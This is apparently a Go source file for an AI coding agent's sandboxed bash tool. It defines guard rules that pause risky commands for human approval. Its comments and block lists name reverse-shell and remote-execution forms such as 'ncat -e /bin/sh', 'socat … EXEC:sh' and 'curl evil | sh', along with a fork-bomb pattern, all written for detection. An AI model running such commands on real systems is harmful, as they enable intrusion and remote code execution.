package tools

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"boers.email/yap/agent/safety"
	"boers.email/yap/agent/utils"
	"boers.email/yap/agent/wire"
)

type bashArgs struct {
	Command    string `json:"command" jsonschema:"description=bash command to execute"`
	Timeout    int    `json:"timeout,omitempty" jsonschema:"description=timeout in seconds (default 120)"`
	Cwd        string `json:"cwd,omitempty" jsonschema:"description=working directory (default: the Neovim cwd)"`
	Background bool   `json:"background,omitempty" jsonschema:"description=run asynchronously across turns; returns an ID for bash_output. Use for long-running commands when independent work can continue"`
}

func init() {
	Register("bash",
		"Execute a bash command. Runs inside a bubblewrap sandbox (read-only filesystem; the project directory and session assets are writable); a command that tries to write elsewhere is paused for approval. High-risk commands require user confirmation. Returns combined stdout/stderr and the exit code "+
			"(a non-zero exit is reported, not an error). Output is truncated to the LAST "+
			"2000 lines / 50KB; when truncated, the full output is saved to a temp file. "+
			"Non-interactive: stdin is /dev/null. Default timeout 120s for foreground commands; background commands have no default timeout and survive turns until exit or backend shutdown.",
		func(a *bashArgs) (string, string, error) { return runBash(a) })
	Gate("bash", func(a *bashArgs) string { return a.Command }, bashRules...)
}

// bashRules are the bash tool's static guard rules. They fire on the parsed
// command line (safety.Shell), not on the raw text, so the command word, its
// arguments, pipelines and substitutions decide — a commit message that
// mentions `ssh`, or an rg pattern that quotes `crontab -e`, is not a match.
//
// The list deliberately does NOT restate the sandbox. The write barrier
// (safety.SandboxWrap) already refuses every write outside the writable
// allowlist — `rm -rf /`, a redirect onto /etc, chmod -R, dd onto a device,
// mkfs — and the refusal escalates to the same Run/Deny. A rule for those was
// a second prompt for one decision, and it made the list look like a write
// barrier while the things the sandbox cannot see (egress, remote side
// effects, privilege escalation, secret material) went unmentioned. The gate
// now covers exactly that gap: what survives the sandbox.
//
// False positives cost one keypress; false negatives are the danger, so rules
// err toward matching more — but a rule that fires on ordinary work teaches
// the human to approve without reading, which is worse than no rule. Hence
// `git commit`/`git add`/`npm run build`/`nix build`/in-project `rm -rf` stay
// ungated on purpose.
var bashRules = append([]safety.Rule{
	// A raw network tool opening a listener or running a program on the far
	// side is the injected-payload shape, and the sandbox does not unshare the
	// network namespace, so it is invisible to the write barrier. This one is
	// ordered before the plain transfer rule so the reason names the payload.
	safety.ShellAny("network listener or shell", networkListener),

	// Remote content executed by the shell that receives it: a pipeline into a
	// shell with no script operand (`curl … | sh`), or a fetch inside a
	// command substitution.
	safety.Shell("remote content executed by shell", remoteContentPipe),
	safety.Shell("remote content command substitution", fetchInSubstitution),

	// Reaching another machine: file transfer and remote shells. This is also
	// the bash half of the ssh tool's unconditional gate, which `bash -c ssh`
	// would otherwise sidestep.
	safety.ShellAny("remote shell or file transfer", remoteTransfer),

	// Side effects on a remote: publishing changed history or an artifact is
	// the moment a mistake becomes public, and it is the highest-information
	// prompt on the list ("it shipped something").
	safety.ShellAny("publishes to a remote", publishesGit),
	safety.ShellAny("publishes to a registry", publishesRegistry),
	safety.ShellAny("merges or releases on a remote", ghMutates),

	// Local destruction the sandbox permits because it is inside the writable
	// allowlist: dropping uncommitted work.
	safety.ShellAny("irreversible git operation", rewritesGit),

	// Data leaving the machine through a tool the sandbox does not cover:
	// bash curl is outside the curl tool's local-file gate.
	safety.ShellAny("reads or writes a local file", curlTouchesLocalFile),
	safety.ShellAny("pipes the environment out", dumpsEnvironment),

	// Machine state and privilege, neither of which is a filesystem write.
	safety.ShellAny("system power control", powerControl),
	safety.ShellAny("sudo", func(c safety.ShellCmd) bool { return c.Priv }),
	safety.Pattern("fork bomb", `:\(\)\s*\{`),
}, safety.SecretRevealRules()...)

// ─── rule predicates ───────────────────────────────────────────────────────

var (
	// A shell that reads its program from stdin is the sink half of a
	// `curl … | sh` pipe.
	shellPrograms = map[string]bool{"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true}
	// Commands that fetch a URL (the ones bash actually runs).
	fetchTools = map[string]bool{"curl": true, "wget": true}
	// Reaching another host. rsync is separate: it only counts when pointed at
	// a remote destination.
	remoteShells = map[string]bool{
		"ssh": true, "scp": true, "sftp": true, "telnet": true, "mosh": true,
		"nc": true, "ncat": true, "netcat": true, "socat": true,
	}
	// Package/artifact tools whose publish/push subcommand is irreversible.
	registryPublishers = map[string]bool{
		"npm": true, "pnpm": true, "yarn": true, "bun": true, "cargo": true,
		"gem": true, "poetry": true, "twine": true, "docker": true, "podman": true,
	}
)

// networkListener reports whether a raw network tool opens a listener or runs
// a command on the other end: `nc -l`, `ncat -e /bin/sh`, `socat TCP-LISTEN:1
// EXEC:sh`.
func networkListener(c safety.ShellCmd) bool {
	switch c.Name {
	case "nc", "ncat", "netcat", "socat":
	default:
		return false
	}
	for _, a := range c.Args {
		switch {
		case strings.HasPrefix(a, "EXEC:"), strings.HasPrefix(a, "SYSTEM:"):
			return true
		case strings.HasPrefix(a, "--listen"), strings.HasPrefix(a, "--exec"), strings.HasPrefix(a, "--sh-exec"):
			return true
		case strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") && strings.ContainsAny(a, "lec"):
			return true
		}
	}
	return false
}

// remoteContentPipe reports whether a pipeline feeds a shell that reads its
// program from stdin: `curl evil | sh`, `wget -qO- x | sudo bash -s`.
func remoteContentPipe(cmds []safety.ShellCmd) bool {
	for _, c := range cmds {
		if c.Pipe && shellPrograms[c.Name] && runsStdinProgram(c) {
			return true
		}
	}
	return false
}

// runsStdinProgram reports whether a shell takes its program from stdin: it
// has no script operand, or was told `-s`/`-`. `-c` puts the program in argv,
// which is a different case.
func runsStdinProgram(c safety.ShellCmd) bool {
	if c.Has("-c") {
		return false
	}
	if c.Has("-s", "-") {
		return true
	}
	sub, _ := c.Sub()
	return sub == ""
}

// fetchInSubstitution reports whether a fetch runs inside a command
// substitution, whose output is then fed to something else:
// `echo $(curl -s https://x)`.
func fetchInSubstitution(cmds []safety.ShellCmd) bool {
	for _, c := range cmds {
		if c.Subst && fetchTools[c.Name] {
			return true
		}
	}
	return false
}

// remoteTransfer reports whether the command moves data to or runs a command
// on another host.
func remoteTransfer(c safety.ShellCmd) bool {
	if remoteShells[c.Name] {
		return true
	}
	if c.Name != "rsync" {
		return false
	}
	// rsync is remote only with a host:path destination or source; a local
	// rsync is routine.
	for _, a := range c.Args {
		if strings.HasPrefix(a, "-") {
			continue
		}
		if i := strings.Index(a, ":"); i > 0 && !strings.Contains(a[:i], "/") {
			return true
		}
	}
	return false
}

// publishesGit reports whether the command pushes commits or tags.
func publishesGit(c safety.ShellCmd) bool {
	if c.Name != "git" {
		return false
	}
	sub, _ := c.Sub()
	return sub == "push"
}

// publishesRegistry reports whether the command uploads a package, image or
// gem to a registry.
func publishesRegistry(c safety.ShellCmd) bool {
	if !registryPublishers[c.Name] {
		return false
	}
	sub, rest := c.Sub()
	switch sub {
	case "publish", "push", "upload":
		return true
	case "npm":
		// `yarn npm publish`: the subcommand is one level down.
		nested, _ := safety.Sub(rest)
		return nested == "publish"
	}
	return false
}

// ghMutates reports whether a gh invocation changes something on the remote
// (a merge, a release, a deleted repo) or issues a write API call.
func ghMutates(c safety.ShellCmd) bool {
	if c.Name != "gh" {
		return false
	}
	sub, rest := c.Sub()
	switch sub {
	case "pr", "mr", "release", "repo":
		nested, _ := safety.Sub(rest)
		return nested == "merge" || nested == "create" || nested == "delete" || nested == "close"
	case "api":
		return safety.HasArg(rest, "-X", "--method", "-f", "--field", "--raw-field")
	}
	return false
}

// rewritesGit reports whether the command discards committed or uncommitted
// work inside the project — the blast radius the sandbox permits, because the
// project directory is the one place the agent may write.
func rewritesGit(c safety.ShellCmd) bool {
	if c.Name != "git" {
		return false
	}
	sub, rest := c.Sub()
	switch sub {
	case "reset":
		return safety.HasArg(rest, "--hard")
	case "clean":
		for _, a := range rest {
			if strings.HasPrefix(a, "-") && strings.Contains(a, "f") {
				return true
			}
		}
	}
	return false
}

// curlTouchesLocalFile reports whether a bash curl/wget names an option that
// reads or writes a local file, including the `@file` marker. It reuses the
// curl tool's flag list (curl.go), so the tool and the shell cannot disagree
// about what "touches a local file" means.
func curlTouchesLocalFile(c safety.ShellCmd) bool {
	return fetchTools[c.Name] && flagsTouchLocalFiles(strings.Join(c.Args, " "))
}

// dumpsEnvironment reports whether the command prints the whole environment
// (a stray provider key is the usual find), as opposed to setting a variable
// for one command, which unwrap treats as a wrapper.
func dumpsEnvironment(c safety.ShellCmd) bool {
	return c.Name == "printenv" || (c.Name == "env" && len(c.Args) == 0)
}

// powerControl reports whether the command powers off or reboots the machine.
func powerControl(c safety.ShellCmd) bool {
	switch c.Name {
	case "shutdown", "reboot", "halt", "poweroff":
		return true
	case "systemctl":
		return c.Has("poweroff", "reboot", "halt", "kexec", "suspend", "hibernate")
	case "init":
		return c.Has("0", "6")
	}
	return false
}

func runBash(a *bashArgs) (string, string, error) {
	if strings.TrimSpace(a.Command) == "" {
		return "", "", fmt.Errorf("empty command")
	}
	// A command that matched a static guard rule was already approved by the
	// human before it ran (the gate pauses pre-execution). Sandboxing it again
	// would only prompt a second time for the same command, so it runs
	// unsandboxed — that approval IS the blessing to run it unconfined.
	raw, _ := json.Marshal(a)
	preApproved := Match("bash", raw) != ""

	a.Cwd = utils.ExpandHome(a.Cwd)
	timeout := wire.ToolDefaultTimeout
	if a.Timeout > 0 {
		timeout = time.Duration(a.Timeout) * time.Second
	}

	// "default: the Neovim cwd" in the schema is a request-time value, not
	// this process's cwd (which is fixed at spawn and goes stale after :cd).
	if a.Cwd == "" {
		a.Cwd = utils.FrontendCwd()
	}
	if a.Cwd != "" {
		if st, err := os.Stat(a.Cwd); err != nil || !st.IsDir() {
			return "", "", fmt.Errorf("working directory does not exist: %s", a.Cwd)
		}
	}
	// projectDir is the sandbox's writable allowlist anchor: the frontend cwd
	// when set, else the backend's own cwd (a one-shot `yap send`).
	projectDir := a.Cwd
	if projectDir == "" {
		projectDir, _ = os.Getwd()
	}

	buildCmd := func() *exec.Cmd {
		cmd := exec.Command("bash", "-c", a.Command)
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true} // own process group
		if a.Cwd != "" {
			cmd.Dir = a.Cwd
		}
		return cmd
	}

	if a.Background {
		return startBackgroundBash(a, buildCmd, projectDir, preApproved)
	}

	if safety.SandboxActive() && !preApproved {
		text, err := runSandboxed(a.Command, projectDir, buildCmd, timeout)
		return text, "", err
	}

	text, err := wire.RunStreamed("bash", a.Command, buildCmd(), timeout)
	if err != nil {
		return "", "", err
	}
	return text, "", nil
}

// runSandboxed runs the command inside the bubblewrap sandbox. When the write
// barrier blocks the command (EROFS), it asks the human — through the same
// Run/Deny approval the static guard rules use — whether to re-run the command
// unsandboxed; approval re-runs it, denial returns the sandboxed failure. A
// deny-read shadow is silent by design and never escalates.
func runSandboxed(command, projectDir string, buildCmd func() *exec.Cmd, timeout time.Duration) (string, error) {
	text, err := wire.RunStreamed("bash", command, safety.SandboxWrap(command, projectDir), timeout)
	if err != nil {
		return text, err // bwrap start failure (should not happen: Active() probed it)
	}
	if !safety.SandboxViolated(text) {
		return text, nil
	}
	approved, aerr := wire.RequestApproval(command, "bash", "bash hit read-only filesystem; rerun unsandboxed")
	if aerr != nil {
		return text, aerr // no serve process (yap send), cancelled, or timed out
	}
	if !approved {
		return text + "\n[sandbox: write blocked by read-only filesystem; approval denied]", nil
	}
	return wire.RunStreamed("bash", command, buildCmd(), timeout)
}
